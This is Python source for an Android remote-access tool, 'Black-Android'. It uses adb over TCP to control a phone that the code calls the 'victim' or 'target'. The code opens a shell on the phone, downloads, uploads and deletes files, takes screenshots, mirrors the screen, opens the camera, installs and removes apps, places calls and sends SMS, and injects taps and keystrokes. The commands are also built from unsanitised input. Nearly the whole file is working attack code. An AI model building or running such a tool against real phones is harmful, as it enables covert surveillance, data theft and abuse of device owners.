import os
import random
import subprocess, time
from colorama import Fore


from modules.BannerModule import Banner

from datetime import date, datetime

def Adb_Command(command):
    return subprocess.getoutput("adb " + command)

def help():
    text = """
All Command
=========================
    Command           Description
    -------           -----------
    help                View Help
    init                Connect Phone the Computer And Access USB
    connect             Connect SmartPhone in IP Address
    device_list         View All Phone
    shell               Acess Shell
    disconnect          Disconnect All Phone
    file_download       Downliad File in Target
    file_upload         Upload File in Target
    file_remove         Remove File in target
    shutdown            Shutdonw Phone
    reboot              Reboot Phone
    screen_shot         Screen Shot in Phone
    screen_share        Screen Share Stream And Touch Screen
    cam_video           Open Camera Vidoe Mode
    cam_image           Open Camera Image Mode
    open_url            Open URL in Browser
    open_video          Open Vdieo in URL
    open_audio          Open Audio in URL
    open_image          Open Image in URL
    install_app         Install App in phone
    remove_app          remove App in phone
    app_list            Get All App Package Name
    run_app             Run Application by Package Name
    close_app           Close Application by Package Name
    type_key hello      Type Text To keyboard
    touch_screen x y    Touch Screen the x, y
    call                Call in Phone
    sms                 SMS in Phone
    clear               Clear Page
    exit                exit script
    """

    print(text)

# start

def init():
    input("[+] Connect Target Phone in USB [ENTER] ")
    Adb_Command("kill-server")
    Adb_Command("devices")
    Adb_Command("tcpip 5555")
    Banner()
    print("[*] Please With...")
    time.sleep(3)
    Banner()
    print("Adb Runing On Phone And type command 'connect'")

def connect():
    phone_ip = input(Fore.LIGHTYELLOW_EX + "Black-Android:/IP-Address# ")
    Adb_Command("connect " + phone_ip)
    Banner()
    print("[+] Successfuly Connected!")


def device_list():
    Adb_Command("devices")
    devices = Adb_Command("devices")
    devices = devices.replace("* daemon started successfully", "")
    devices = devices.replace("List of devices attached", "")
    print("[*] All Trgets:")
    print(devices)

def disconnect():
    Adb_Command("kill-server")
    Banner()
    print("[+] Disconnect All Victim")

def shell():
    os.system("adb shell")
    Banner()
    print("[-] Stop Shell Access ! ! !")

def file_download():
    path = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Phone-Path# ")
    Adb_Command("pull {} downloads".format(path))
    Banner()
    print("[+] Successfuly Download File To ./downloads/")

def file_upload():
    info = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Computer-Path# ")
    info2 = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Phone-Path# ")
    print(Adb_Command("push {} {}".format(info, info2)))
    Banner()
    print("[+] Successfuly Upload Fie To " + info2)

def file_remove():
    path = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Phone-Path# ")
    Adb_Command("shell rm " + path)
    Banner()
    print("[+] Successfuly Remove File To " + path)



def shutdown():
    Adb_Command("reboot -p")
    print("[+] Successfuly Sutdown Phone ! ! !")

def reboot():
    Adb_Command("reboot")
    print("[+] Successfuly Reboot Phone ! ! !")


def screen_shot():
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    todays_date = str(date.today())
    path = "screenshot/shot_{}_{}.png".format(todays_date, current_time)
    Adb_Command("exec-out screencap -p > " + path)
    print("[+] Screen Shot has a ban Path : " + path)

def screen_share():
    print("[*] Screen Share Started ")
    subprocess.getoutput("scrcpy -m 1080")
    Banner()
    print("[+] CLose Screen Share")


def open_camera(mode):
    if mode == "vidoe":
        Adb_Command('shell "am start -a android.media.action.VIDEO_CAPTURE"')
    elif mode == "image":
        Adb_Command('shell "am start -a android.media.action.IMAGE_CAPTURE"')

    Banner()

    print("[+] Successfuly Open Camera is mode " + mode)


def open_url():
    url = input(Fore.LIGHTYELLOW_EX + "Black-Android:/URL# ")
    Adb_Command("shell am start -a android.intent.action.VIEW -d " + url)
    Banner()
    print("[+] Successfuly Open URL : " + url)


def open_video():
    video_url = input(Fore.LIGHTYELLOW_EX + "Black-Android:/VIDEO-URL# ")
    Adb_Command("shell am start -a android.intent.action.VIEW  -t video/mp4 -d " + video_url)
    Banner()
    print("[+] Successfuly Open Video is URL : " + video_url)

def open_audio():
    audio_url = input(Fore.LIGHTYELLOW_EX + "Black-Android:/AUDIO-URL# ")
    Adb_Command("shell am start -a android.intent.action.VIEW -t audio/mp3 -d " + audio_url)
    Banner()
    print("[+] Successfuly Open Audio is URL : " + audio_url)


def open_image():
    image_url = input(Fore.LIGHTYELLOW_EX + "Black-Android:/IMAGE-URL# ")
    Adb_Command("shell am start -t image/png -d " + image_url)
    Banner()
    print("[+] Successfuly Open Image is URL : " + image_url)

def install_app():
    path = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Apk-File# ")
    Adb_Command("install " + path)
    Banner()
    print("App install On Path : " + path)

def remove_app():
    app_name = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Package-Name# ")
    Adb_Command("uninstall " + app_name)
    Banner()
    print("App install On Package Name : " + app_name)

def app_list():
    packs = Adb_Command("shell pm list packages").split()

    i = 1

    for pack in packs:
        print("[{}] Package Name is : {}".format(i, pack.replace("package:", "")))
        i += 1

def run_app():
    app_name = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Package-Name# ")
    Adb_Command("shell monkey -p '{}' -v 1".format(app_name))
    Banner()
    print("[*] Successfuly App run is package name : " + app_name)

def close_app():
    app_name = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Package-Name# ")
    Adb_Command("shell am force-stop "+app_name)
    Banner()
    print("[*] Successfuly App Closed is package name : " + app_name)

def type_key(key):
    Adb_Command('shell input text "{}"'.format(key))


def touch_screen(postion):
    Adb_Command("shell input tap " + postion)

def call():
    phone_number = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Phone-Number# ")
    Adb_Command("shell am start -a android.intent.action.CALL -d tel:" + phone_number)
    Banner()
    print("[+] Open Call is number : " + phone_number)

def sms():
    phone_number = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Phone-Number# ")
    text = input(Fore.LIGHTYELLOW_EX + "Black-Android:/Sms-Message# ")
    Adb_Command('shell am start -a android.intent.action.SENDTO -d sms:{} --es sms_body "{}"'.format(phone_number, text))
    Banner()
    print("[+] Open Sms is number : " + phone_number)

# end

def quit_script():
    Banner()
    print("[+] You Exited!")
    exit()
